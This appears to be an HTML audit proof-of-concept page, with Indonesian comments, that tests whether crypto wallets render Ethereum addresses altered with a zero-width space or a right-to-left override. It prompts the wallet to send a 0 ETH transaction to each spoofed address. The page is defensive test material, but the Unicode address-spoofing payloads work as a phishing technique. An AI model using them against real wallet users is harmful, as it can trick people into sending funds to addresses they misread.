<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>Audit: Address Spoofing Test</title>
    <style>
        body { font-family: sans-serif; padding: 30px; background: #f0f2f5; }
        .test-box { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        button { background: #e91e63; color: white; border: none; padding: 12px; width: 100%; border-radius: 5px; cursor: pointer; font-weight: bold; margin-bottom: 10px; }
        .address-display { font-family: monospace; background: #eee; padding: 10px; word-break: break-all; font-size: 0.85rem; border-radius: 5px; }
        h4 { margin-top: 20px; color: #333; }
    </style>
</head>
<body>

<div class="test-box">
    <h2>PoC: Address Spoofing</h2>
    <p>Gunakan tes ini untuk melihat bagaimana wallet menampilkan alamat yang mengandung karakter khusus.</p>

    <h4>1. Zero-Width Space Injection</h4>
    <p class="address-display" id="addr1"></p>
    <button onclick="testSpoof(1)">Kirim ke Alamat Ini</button>

    <h4>2. RTL Override (Membalik Urutan)</h4>
    <p class="address-display" id="addr2"></p>
    <button onclick="testSpoof(2)">Kirim ke Alamat Ini</button>
</div>

<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>

<script>
    // Alamat asli (Ganti dengan alamat testing milikmu)
    const REAL_ADDRESS = "0x742d35Cc6634C0532925a3b844Bc454e4438f44e";

    // 1. Menyisipkan Zero-Width Space (U+200B) di tengah alamat
    // Ini bertujuan melihat apakah wallet memfilter karakter non-render
    const zeroWidthAddr = REAL_ADDRESS.slice(0, 10) + "\u200B" + REAL_ADDRESS.slice(10);
    document.getElementById('addr1').innerText = "Target: " + zeroWidthAddr;

    // 2. Menggunakan RTL Override (U+202E)
    // Berpotensi membalikkan tampilan teks di beberapa UI wallet
    const rtlAddr = "\u202E" + REAL_ADDRESS.split('').reverse().join('');
    document.getElementById('addr2').innerText = "Target: " + rtlAddr;

    async function testSpoof(type) {
        if (!window.ethereum) return alert("Wallet tidak ditemukan");
        
        const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        const target = (type === 1) ? zeroWidthAddr : rtlAddr;

        const transactionParameters = {
            to: target, // Alamat dengan karakter spesial
            from: accounts[0],
            value: '0x0', // 0 ETH saja untuk tes
            gas: '0x5028', // 21000 gas
        };

        try {
            log("Memicu konfirmasi wallet...");
            await window.ethereum.request({
                method: 'eth_sendTransaction',
                params: [transactionParameters],
            });
        } catch (error) {
            console.error("User menolak atau error:", error);
        }
    }

    function log(msg) { console.log("[Audit]", msg); }
</script>
</body>
</html>
